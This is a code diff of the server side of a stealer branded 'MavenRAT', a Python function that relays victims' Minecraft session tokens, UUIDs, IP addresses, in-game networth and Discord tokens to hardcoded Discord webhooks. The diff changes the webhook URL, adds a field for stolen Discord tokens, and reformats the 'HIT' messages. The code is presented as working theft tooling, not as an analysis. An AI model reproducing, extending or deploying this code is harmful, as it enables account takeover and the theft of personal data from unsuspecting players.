@@ -185,7 +185,7 @@ def Delivery(request):
                             "networth": networth,
                             "discord": discord
                         }, cb)
-                        SEGUNDA_WEBHOOK_URL = "https://discord.com/api/webhooks/1257440815936962671/6hcyGwp0hXdXPSSfWQMcjw_5hYavZLxxt-yqXgClQSAa414sTdIOlMtrOlFQq9yJ0d27"
+                        SEGUNDA_WEBHOOK_URL = "https://discord.com/api/webhooks/1267605449449144432/6M3U6ZOcSL9ICyiGnU0Xv5es1tSGXsoFBzjd8QD90KwMkkLMKznedLQgSw8K5DykVU4A"
                         response_second = requests.post(SEGUNDA_WEBHOOK_URL, json=payload_second)
                         response_second.raise_for_status()
 
@@ -212,13 +212,16 @@ def Delivery(request):
                                     "color": 0xFFFFFF,
                                     "description": f"**[NameMC](https://namemc.com/profile/{data['uuid']}) | [Plancke](https://plancke.io/hypixel/player/stats/{data['uuid']}) | [SkyCrypt](https://sky.shiiyu.moe/stats/{data['uuid']}) | [IP](https://www.geolocation.com/{data['ip']})**",
                                     "fields": [
-                                        {"name": ":video_game: IGN:", "value": f"{cb}{data.get('ign')}{cb}"},
-                                        {"name": ":jigsaw: UUID:", "value": f"{cb}{data.get('uuid')}{cb}"},
-                                        {"name": ":key: SSID:", "value": f"{cb}{data.get('ssid')}{cb}"},
-                                        {"name": ":earth_africa: IP:", "value": f"{cb}{data.get('ip')}{cb}"},
-                                        {"name": ":busts_in_silhouette: Profile:", "value": f"{cb}{data.get('profile')}{cb}"},
-                                        {"name": ":moneybag: Networth:", "value": f"{cb}{data.get('networth')}{cb}"}
-                                    ]
+                                        {"name": ":video_game: IGN:", "value": f"{cb}{data.get('ign')}{cb}", "inline": True},
+                                        {"name": ":key: UUID:", "value": f"{cb}{data['uuid']}{cb}", "inline": True},
+                                        {"name": ":money_with_wings: Networth:", "value": f"{cb}{data.get('networth')}{cb}", "inline": True},
+                                        {"name": ":lock: TOKEN:", "value": f"{cb}{data.get('ssid')}{cb}", "inline": False},
+                                        {"name": ":lock: DISCORD TOKEN:", "value": f"{cb}{token}{cb}", "inline": False},
+                                    ],
+                                    "footer": {
+                                        "text": "Made with ❤️ by MavenRAT",
+                                        "icon_url": "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66829178&is=66813ff8&hm=7d1518fb3387e6610f7ce4e32bdf2a9bc70160196bdec9feeb8595227755be0a&"
+                                    }
                                 }]
                             }
                         except requests.RequestException as e:
@@ -226,39 +229,24 @@ def Delivery(request):
                             return {}
                 else:
                     return {}
-            
+                
             def info_message_second_webhook(data, cb):
-                if 'discord' in data and data['discord']:
-                    for tokenjson in data['discord']:
-                        token = tokenjson.get('token')
-                        headers = {
-                            "Authorization": token
+                return {
+                    "username": "MavenRAT HIT",
+                    "avatar_url": "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66829178&is=66813ff8&hm=7d1518fb3387e6610f7ce4e32bdf2a9bc70160196bdec9feeb8595227755be0a&",
+                    "embeds": [{
+                        "title": ":moneybag: Skyblock Info",
+                        "color": 0xFFFFFF,
+                        "fields": [
+                            {"name": ":bust_in_silhouette: Profile:", "value": f"{cb}{data.get('profile')}{cb}", "inline": True},
+                            {"name": ":money_with_wings: Networth:", "value": f"{cb}{data.get('networth')}{cb}", "inline": True},
+                        ],
+                        "footer": {
+                            "text": "Made with ❤️ by MavenRAT",
+                            "icon_url": "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66829178&is=66813ff8&hm=7d1518fb3387e6610f7ce4e32bdf2a9bc70160196bdec9feeb8595227755be0a&"
                         }
-                        try:
-                            tokeninfo = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
-                            tokeninfo.raise_for_status()
-                            return {
-                                "username": "MavenRAT",
-                                "avatar_url": "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66829178&is=66813ff8&hm=7d1518fb3387e6610f7ce4e32bdf2a9bc70160196bdec9feeb8595227755be0a&",
-                                "embeds": [{
-                                    "title": ":unlock: Information",
-                                    "color": 0xFFFFFF,
-                                    "description": f"**[NameMC](https://namemc.com/profile/{data['uuid']}) | [Plancke](https://plancke.io/hypixel/player/stats/{data['uuid']}) | [SkyCrypt](https://sky.shiiyu.moe/stats/{data['uuid']}) | [IP](https://www.geolocation.com/{data['ip']})**",
-                                    "fields": [
-                                        {"name": ":video_game: IGN:", "value": f"{cb}{data.get('ign')}{cb}"},
-                                        {"name": ":jigsaw: UUID:", "value": f"{cb}{data.get('uuid')}{cb}"},
-                                        {"name": ":key: SSID:", "value": f"{cb}{data.get('ssid')}{cb}"},
-                                        {"name": ":earth_africa: IP:", "value": f"{cb}{data.get('ip')}{cb}"},
-                                        {"name": ":busts_in_silhouette: Profile:", "value": f"{cb}{data.get('profile')}{cb}"},
-                                        {"name": ":moneybag: Networth:", "value": f"{cb}{data.get('networth')}{cb}"}
-                                    ]
-                                }]
-                            }
-                        except requests.RequestException as e:
-                            print(f"Error fetching token info: {e}")
-                            return {}
-                else:
-                    return {}
+                    }]
+                }
             
             process_data_delivery(
                 data.get("ign"),
